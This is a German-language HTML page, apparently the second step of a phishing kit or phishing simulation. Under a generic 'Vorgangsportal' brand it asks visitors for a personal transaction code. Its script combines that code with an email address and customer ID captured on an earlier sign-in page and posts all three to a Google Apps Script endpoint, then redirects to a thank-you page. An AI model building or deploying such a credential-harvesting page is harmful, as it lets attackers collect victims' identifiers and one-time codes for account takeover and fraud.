
<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Vorgang bestätigen</title>
<style>
*{box-sizing:border-box}
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#fff;font-family:Arial,sans-serif;color:#253044}
.container{width:100%;max-width:420px;padding:40px 35px;border:1px solid #e5e8ed;border-radius:12px;box-shadow:0 5px 24px #0000000f}
.brand{text-align:center;font-size:24px;font-weight:bold;margin-bottom:30px}
h1{font-size:23px;margin:0 0 12px}
p{font-size:14px;line-height:1.5;color:#626d7c;margin-bottom:25px}
label{display:block;font-size:14px;font-weight:bold;margin-bottom:8px}
input{width:100%;height:50px;padding:0 13px;border:1px solid #aeb8c5;border-radius:6px;font-size:16px;margin-bottom:20px}
button{width:100%;height:48px;border:0;border-radius:25px;background:#253044;color:white;font-size:16px;font-weight:bold;cursor:pointer}
button:disabled{opacity:.6;cursor:wait}
.notice{font-size:12px;line-height:1.5;color:#626d7c;background:#f4f6f8;padding:12px;border-radius:6px;margin-bottom:20px}
.footer{text-align:center;font-size:12px;color:#89919d;margin-top:22px}
</style>
</head>
<body>
<main class="container">
<div class="brand">VORGANGSPORTAL</div>
<h1>Vorgang bestätigen</h1>
<p>Bitte geben Sie Ihren persönlichen Vorgangscode ein.</p>

<div class="notice">
Mit dem Absenden werden Ihre E-Mail-Adresse, Kundenkennung und Ihr Vorgangscode an unsere Vorgangsverwaltung übermittelt.
</div>

<form id="form">
<label for="vorgangscode">Vorgangscode</label>
<input type="text" id="vorgangscode" autocomplete="off" required>

<button type="submit" id="submitButton">Vorgang bestätigen</button>
</form>

<div class="footer">Vorgangsverwaltung</div>
</main>

<script>
const SCRIPT_URL = "DEINE_GOOGLE_APPS_SCRIPT_URL";

document.getElementById("form").addEventListener("submit", async function(e) {
    e.preventDefault();

    const email = sessionStorage.getItem("test_email");
    const kundenkennung = sessionStorage.getItem("test_kundenkennung");
    const vorgangscode = document.getElementById("vorgangscode").value.trim();

    if (!email || !kundenkennung) {
        alert("Bitte beginnen Sie die Vorgangsprüfung erneut.");
        window.location.href = "signin.html";
        return;
    }

    const button = document.getElementById("submitButton");
    button.disabled = true;
    button.textContent = "Wird übermittelt...";

    const data = {
        email: email,
        kundenkennung: kundenkennung,
        vorgangscode: vorgangscode
    };

    try {
        const response = await fetch(SCRIPT_URL, {
            method: "POST",
            headers: {
                "Content-Type": "text/plain;charset=utf-8"
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();

        if (!result.success) {
            throw new Error("Übermittlung fehlgeschlagen");
        }

        sessionStorage.removeItem("test_email");
        sessionStorage.removeItem("test_kundenkennung");

        window.location.href = "danke.html";

    } catch (error) {
        button.disabled = false;
        button.textContent = "Vorgang bestätigen";
        alert("Die Übermittlung konnte nicht bestätigt werden. Bitte versuchen Sie es erneut.");
    }
});
</script>
</body>
</html>
